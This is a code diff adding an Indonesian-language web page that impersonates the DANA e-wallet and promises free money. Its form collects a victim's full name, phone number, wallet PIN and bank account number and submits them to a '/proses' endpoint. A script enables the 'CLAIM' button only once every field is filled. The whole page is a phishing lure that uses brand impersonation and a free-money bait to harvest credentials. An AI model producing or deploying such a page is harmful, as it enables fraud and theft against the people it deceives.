@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>DANA - Klaim Uang</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: sans-serif;
+      background-color: #f4f4f9;
+    }
+
+    .kotak {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      width: 80%;
+      max-width: 350px;
+    }
+
+    /* Bikin form & input tampil menurun (kolom) */
+    form {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+    }
+
+    input {
+      margin-bottom: 12px;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      font-size: 14px;
+      border:2px solid #CCCCCC;
+    }
+    input:focus{
+      outline:none;
+      border:2px solid #008cff;
+    }
+
+    /* Style Tombol Aktif */
+    button {
+      padding: 12px;
+      background-color: #008cff;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    /* Style Tombol Mati (Abu-abu) */
+    button:disabled {
+      background-color: #cccccc;
+      color: #666666;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="kotak">
+    <h1 style="margin: 0; color: #008cff;">DANA</h1>
+    <h3 style="margin-top: 5px; color: #333;">DAPATKAN UANG GRATIS</h3>
+    
+    <form action="/proses" method="post">
+      <input type="text" name="nama_user" placeholder="Nama Panjang" required>
+      <input type="tel" name="telepon" placeholder="No Handphone" required>
+      <input type="number" name="pin_user" placeholder="PIN minimal 6 digit" required>
+      <input type="number" name="nomor_rekening" placeholder="Nomor Rekening" required>
+      <button type="submit" id="btnKirim" disabled>CLAIM</button>
+    </form>
+  </div>
+  
+  <script>
+    const form = document.querySelector('form');
+    const inputs = form.querySelectorAll('input');
+    const tombol = document.getElementById('btnKirim');
+
+    // Cek status input setiap kali user ngetik
+    form.addEventListener('input', () => {
+      let semuaTerisi = true;
+
+      inputs.forEach(input => {
+        if (input.value.trim() === '') {
+          semuaTerisi = false;
+        }
+      });
+
+      // Tombol aktif kalau semua terisi, tetap abu-abu kalau ada yang kosong
+      tombol.disabled = !semuaTerisi;
+    });
+  </script>
+
+</body>
+</html>
